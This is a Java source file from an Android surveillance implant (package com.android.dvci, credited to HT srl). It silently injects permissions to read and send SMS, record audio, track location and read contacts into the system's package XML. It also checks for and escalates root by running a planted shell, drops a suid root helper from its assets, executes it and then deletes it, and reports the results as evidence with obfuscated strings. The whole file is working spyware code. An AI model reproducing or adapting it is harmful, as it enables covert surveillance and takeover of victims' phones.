/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 27-jun-2011
 **********************************************/

package com.android.dvci.capabilities;

import android.content.Context;

import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.file.AutoFile;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import org.xml.sax.SAXException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;

import javax.xml.parsers.FactoryConfigurationError;
import javax.xml.parsers.ParserConfigurationException;

public class PackageInfo {
	private static final String TAG = "PackageInfo";

	private static boolean sentInfo;

	private String packageName;
	private FileInputStream fin;
	private XmlParser xml;

	private String requiredPerms[] = StringUtils
			.split(M.e("android.permission.READ_SMS,android.permission.SEND_SMS,android.permission.PROCESS_OUTGOING_CALLS,android.permission.WRITE_EXTERNAL_STORAGE,android.permission.WRITE_SMS,android.permission.ACCESS_WIFI_STATE,android.permission.ACCESS_COARSE_LOCATION,android.permission.RECEIVE_SMS,android.permission.READ_CONTACTS,android.permission.CALL_PHONE,android.permission.READ_PHONE_STATE,android.permission.RECEIVE_BOOT_COMPLETED,android.permission.INTERNET,android.permission.CHANGE_WIFI_STATE,android.permission.ACCESS_FINE_LOCATION,android.permission.WAKE_LOCK,android.permission.RECORD_AUDIO,android.permission.ACCESS_NETWORK_STATE"));

	// XML da parsare
	public PackageInfo(FileInputStream fin, String packageName) throws SAXException, IOException,
			ParserConfigurationException, FactoryConfigurationError {
		this.fin = fin;
		this.packageName = packageName;

		this.xml = new XmlParser(this.fin);
	}

	public String getPackagePath() {
		return this.xml.getPackagePath(this.packageName);
	}

	static public String getPackageName() {
		return Status.getAppContext().getPackageName();
	}

	private ArrayList<String> getPackagePermissions() {
		return this.xml.getPackagePermissions(this.packageName);
	}

	public boolean addRequiredPermissions(String outName) {
		if (this.xml.setPackagePermissions(this.packageName, this.requiredPerms) == false) {
			return false;
		}

		serialize(outName);

		return true;
	}

	private void serialize(String fileName) {
		FileOutputStream fos;

		try {
			fos = Status.getAppContext().openFileOutput(fileName, Context.MODE_WORLD_READABLE);

			String xmlOut = xml.serializeXml();
			fos.write(xmlOut.getBytes());
			fos.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " (serialize): Exception during file creation"); //$NON-NLS-1$
			}
		}
	}

	public boolean checkRequiredPermission() {
		boolean permFound = false;
		ArrayList<String> a = getPackagePermissions();

		for (int i = 0; i < this.requiredPerms.length; i++) {
			for (String actualPerms : a) {
				permFound = false;

				if (actualPerms.equals(this.requiredPerms[i]) == true) {
					permFound = true;
					break;
				}
			}

			if (permFound == false) {
				break;
			}
		}

		return permFound;
	}

	static synchronized public boolean checkRoot() { //$NON-NLS-1$
		boolean isRoot = false;

		if (Status.haveRoot()) {
			return true;
		}

		try {
			// Verifichiamo di essere root
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
			}
			final AutoFile file = new AutoFile(Configuration.shellFileBase);

			if (file.exists() && file.canRead()) {

				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
				String stdout = p.getStdout();
				if (stdout.startsWith(M.e("uid=0"))) {

					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$

						Date timestamp = new Date();
						long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;

						if (!sentInfo) {
							EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
							if (Cfg.DEMO) {
								Status.self().makeToast("Root acquired");
							}
						}

					} else {
						if (!sentInfo) {
							EvidenceBuilder.info(M.e("Root"));
						}
					}

					isRoot = true;
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
					}
					if (!sentInfo) {
						EvidenceBuilder.info("Root: NO");
					}
				}
				sentInfo = true;
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		Status.setRoot(isRoot);
		return isRoot;
	}

	static public boolean hasSu() {
		if (checkRootPackages() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (hasSu): checkRootPackages true"); //$NON-NLS-1$
			}
			return true;
		}

		if (checkDebugBuild() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (hasSu): checkDebugBuild true"); //$NON-NLS-1$
			}
			return true;
		}

		return false;
	}

	private static boolean checkRootPackages() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkRootPackages)");
		}
		try {
			// 32_39=/system/app/Superuser.apk
			File file = new File(M.e("/system/app/Superuser.apk"));
			if (file.exists()) {
				return true;
			}

			// 32_40=/data/app/com.noshufou.android.su-1.apk
			file = new File(M.e("/data/app/com.noshufou.android.su-1.apk"));
			if (file.exists()) {
				return true;
			}

			// 32_41=/data/app/com.noshufou.android.su-2.apk
			file = new File(M.e("/data/app/com.noshufou.android.su-2.apk"));
			if (file.exists()) {
				return true;
			}

			// 32_42=/system/bin/su
			file = new File(M.e("/system/bin/su"));
			if (file.exists()) {
				return true;
			}

			// 32_42=/system/bin/su
			file = new File(M.e("/system/xbin/su"));
			if (file.exists()) {
				return true;
			}
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkRootPackages), no root found");
		}
		return false;
	}

	private static boolean checkDebugBuild() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkDebugBuild)");
		}
		String buildTags = android.os.Build.TAGS;

		if (buildTags != null && buildTags.contains(M.e("test-keys"))) {
			return true;
		}

		return false;
	}

	public static boolean upgradeRoot() {
		final AutoFile file = new AutoFile(Configuration.oldShellFileBase);

		if (file.exists() && file.canRead()) {

			try {
				ExecuteResult p = Execute.execute(Configuration.oldShellFileBase + M.e(" qzx id"));
				String stdout = p.getStdout();
				if (stdout.startsWith(M.e("uid=0"))) {

					final File filesPath = Status.getAppContext().getFilesDir();
					final String path = filesPath.getAbsolutePath();

					final String suidext = M.e("ss"); // suidext

					AutoFile dbgd = new AutoFile(M.e("/system/bin/dbgd"));
					if (dbgd.exists()) {
						Utils.dumpAsset(M.e("jb.data"), suidext);// selinux_suidext
					} else {
						Utils.dumpAsset(M.e("sb.data"), suidext);// suidext
					}

					AutoFile suidextFile = new AutoFile(path + "/" + suidext);
					suidextFile.chmod("755");
					try {
						p = Execute.execute(new String[]{Configuration.oldShellFileBase, "qzx", suidextFile.getFilename() + " rt"});
						stdout = p.getStdout();
						if (Cfg.DEBUG) {
							Check.log(TAG + " (upgradeRoot), result: " + stdout);
						}

					} catch (Exception ex) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (upgradeRoot), ERROR: " + ex);
						}
					} finally {
						suidextFile.delete();
					}

					for (int i = 0; i < 10; i++) {
						Utils.sleep(1000);
						if (checkRoot())
							return true;
					}
				}
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (upgradeRoot), ERROR: " + ex);
				}
			}
		}
		return false;
	}
}
